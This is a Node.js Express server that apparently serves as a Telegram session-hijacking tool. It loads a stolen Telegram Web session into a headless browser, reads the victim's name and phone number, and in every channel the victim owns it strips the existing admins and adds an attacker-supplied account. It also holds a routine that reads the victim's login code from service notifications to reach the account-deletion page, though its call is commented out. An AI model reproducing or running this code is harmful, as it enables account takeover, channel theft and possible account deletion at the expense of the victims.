const express = require("express");
const multer = require("multer");
const path = require("path");
const puppeteer = require('puppeteer');
const bodyParser = require('body-parser');

const app = express();
const port = process.env.PORT || 5000;

app.use(express.json());
app.use(express.urlencoded({ extended: true }));


app.get('/', (req, res) => {
      res.send('123')
 })


app.post("/uploadFile", (req, res) => {
   var session = req.body.session
   var newadmin = req.body.newadmin

   console.log(session)

const puppeteer = require('puppeteer');


async function getNumber() {
   const browser = await puppeteer.launch({
      executablePath: '/usr/bin/chromium-browser',
      args: ['--no-sandbox'],
      // headless: false,
});
   const page = await browser.newPage();
  await page.setViewport({
   width: 1920,
   height: 600
});
  await page.goto('https://web.telegram.org/z/');
  await page.evaluate((session) => {
   let data = JSON.parse(session);
Object.keys(data).forEach(function (k) {
    localStorage.setItem(k, data[k]);
});
document.location.reload(true);
  }, session);
  await page.waitForSelector('.ListItem-button')
   await page.click('.DropdownMenu')
   await page.waitForTimeout(500)
   await page.click('.icon-saved-messages')
   await page.waitForTimeout(500)
   await page.click('.DropdownMenu')
   await page.waitForTimeout(500)
   await page.click('.icon-settings')
   await page.waitForTimeout(500)
   const phoneElement = await page.waitForSelector('.ChatExtra .ListItem:first-child .multiline-item .title');
   let phoneUser = await phoneElement.evaluate(el => el.textContent);
   await browser.close()

   console.log(phoneUser)
   return phoneUser
}


async function checkCode() {
   const browser = await puppeteer.launch({executablePath: '/usr/bin/chromium-browser',
   args: ['--no-sandbox']});
   const page = await browser.newPage();
  await page.setViewport({
   width: 1920,
   height: 600
});
await page.goto('https://web.telegram.org/z/');
await page.evaluate((session) => {
 let data = JSON.parse(session)
Object.keys(data).forEach(function (k) {
  localStorage.setItem(k, data[k]);
});
document.location.reload(true);
}, session);
   await page.waitForSelector('.ListItem-button')
   await page.type('input[placeholder="Search"]', 'Telegram', { delay: 100 });
   await page.waitForTimeout(1000)
   const [button] = await page.$x("//span[contains(., 'service notifications')]");
   if (button) {
       await button.click();
   }
   await page.waitForTimeout(1000)
   const textCode = await page.evaluate(() => document.querySelectorAll('.message-list-item')[document.querySelectorAll('.message-list-item').length - 1].innerHTML)
   await page.waitForTimeout(500)
   await browser.close()
   return textCode
}



async function deleteAccount(num) {
   const browser = await puppeteer.launch({executablePath: '/usr/bin/chromium-browser',
   args: ['--no-sandbox']});
   const page = await browser.newPage();
  await page.setViewport({
   width: 1920,
   height: 600
});
  await page.goto('https://my.telegram.org/auth');
  await page.waitForSelector('.form-control.input-large')
   await page.type('.form-control.input-large', num, { delay: 100 });
   await page.waitForTimeout(500)
   await page.click('.btn.btn-primary.btn-lg')

   await page.waitForTimeout(500)


   const code = await checkCode()

   await page.waitForTimeout(500)

   var subStr = code.match(":<br>(.*)<br><br>Do");
   await page.type('input[placeholder="Confirmation code"]', subStr[1], { delay: 100 });
   await page.waitForTimeout(3000)
   await page.click('#my_login_form .support_submit .btn[type="submit"]')
   await page.waitForTimeout(1000)
   await page.click('a[href="/delete"]')
   await page.waitForTimeout(1000)
   console.log('delete account owner!')
   await browser.close()
   // await page.click('#deactivate_phone_form button[type="submit"]')
   // await page.waitForTimeout(500)
   // await page.click('#deactivate_submit_btn')
}


async function createFolder() {

   let myname = 'none'
   const log = []

   // {headless:false}
  const browser = await puppeteer.launch({
      // headless:false,
      executablePath: '/usr/bin/chromium-browser',
      args: ['--no-sandbox']
   });
  const page = await browser.newPage();
  await page.setViewport({
   width: 1920,
   height: 600
});
  await page.goto('https://web.telegram.org/z/');
  await page.evaluate((session) => {
   let data = JSON.parse(session)
   Object.keys(data).forEach(function (k) {
      localStorage.setItem(k, data[k]);
   });
   document.location.reload(true);
  }, session);
   await page.waitForSelector('.ListItem-button')
   await page.click('.DropdownMenu')
   await page.waitForTimeout(500)
   await page.click('.icon-settings')

   await page.waitForTimeout(500)

   const mynameElement = await page.waitForSelector('.fullName');
   myname = await mynameElement.evaluate(el => el.textContent);
   console.log(myname)

   await page.waitForTimeout(500)
   await page.click('.icon-folder')
   await page.waitForTimeout(500)
   await page.click('.icon-add')
   await page.waitForSelector('input[aria-label="Folder name"]')
   await page.type('input[aria-label="Folder name"]', "my-all-channel", { delay: 100 });
   await page.waitForTimeout(500)
   await page.click('.settings-item.no-border.pt-3 .icon-add')
   await page.waitForTimeout(500)
   await page.click('.ListItem-button > .icon-channel')
   await page.waitForTimeout(500)
   await page.click('button[title="Confirm"]')
   await page.waitForTimeout(500)
   await page.click('button[title="Create folder"]')
   await page.waitForTimeout(1000)
   await page.click('#Settings > div.Transition__slide--active > div.left-header > button')
   await page.waitForTimeout(1000)
   await page.click('#Settings > div.Transition__slide--active > div.left-header > button')
   await page.waitForTimeout(1000)
   const [button] = await page.$x("//span[contains(., 'my-all-channel')]");
   if (button) {
       await button.click();
   }
   await page.waitForTimeout(500)

   const channelArray = await page.$$('#LeftColumn-main > div.Transition.zoom-fade > div > div > div.Transition.slide-optimized > div.Transition__slide--active > div > div > div.ListItem.Chat.chat-item-clickable.group.no-selection.has-ripple')
   
   let firstChannel = true;
   let firstOwner = true;
   for (let channel of channelArray){
      
      await page.waitForTimeout(300)
      await channel.click()
      if (firstChannel) {
         await page.waitForTimeout(500)
         await page.click('.MiddleHeader')
         firstChannel = false
      }

      await page.waitForTimeout(500)

      if (await page.$('#RightColumn > div.RightHeader > div > div > section > button') !== null) {

         await page.waitForTimeout(1000)

         
         // await page.waitForSelector('.multiline-item .title')
         const link = await page.evaluate(() => {
           if (document.querySelector('.multiline-item .title')) {
               return document.querySelector('.multiline-item .title').textContent
           } else {
               return document.querySelector('#RightColumn > div.Transition.zoom-fade > div > div > div.profile-info > div.ProfileInfo > div.info > div > div').textContent
           }
         })
         
         
         await page.click('#RightColumn > div.RightHeader > div > div > section > button')
         await page.waitForTimeout(500)
         await page.click('.icon-admin')
         await page.waitForTimeout(1000)


         const ownerNickname = await page.evaluate(() => Array.from(document.querySelectorAll('span.status')).filter(item => item.textContent.includes('Owner'))[0].closest('.info').querySelector('h3').textContent)
         
         console.log(ownerNickname);

         if (ownerNickname.trim() === myname) {

            await deleteAdmin()

            async function deleteAdmin() {
               await page.waitForTimeout(1000)
               const admin = await page.$('.Management .ListItem.chat-item-clickable:nth-child(3)')
               console.log(admin)
               // await page.waitForTimeout(10000)
               if (await page.$('.Management .ListItem.chat-item-clickable:nth-child(3)') !== null) {
                  await admin.click()
                  await page.waitForTimeout(700)
                  // await page.waitForSelector('.icon-delete')
                  await page.click('.icon-delete')
                  await page.waitForTimeout(700)
                  // await page.waitForSelector('.Button.confirm-dialog-button.default.danger.text')
                  page.click('.Button.confirm-dialog-button.default.danger.text')
                  await deleteAdmin()
               }
            }

            await page.waitForTimeout(500)
            // await page.waitForSelector('.icon-add-user-filled')
            await page.click('.icon-add-user-filled')

            if (firstOwner) {
               await page.waitForTimeout(1000)
               // await page.waitForSelector('.Management__filter input[placeholder="Search"]')
               await page.type('.Management__filter input[placeholder="Search"]', newadmin, { delay: 100 });
               firstOwner = false
            }
            

            await page.waitForTimeout(1000)
            await page.click('.ListItem.chat-item-clickable.scroll-item.no-selection')

            await page.waitForTimeout(500)
            await page.click('.Button[aria-label="Save"]')

            await page.waitForTimeout(500)

            log.push({link, role: 'owner'})

         } else {
            log.push({link, role: 'admin'})
         }

      }
   }

   await browser.close();
   let number = await getNumber()
   
   // await deleteAccount(number)

   if (log.length > 0) {
      res.send(JSON.stringify(log));
   } else {
      log = 'none'
      res.send(log);
   }

}

createFolder()

});

app.listen(port, () => console.log(`App listening on port ${port}!`));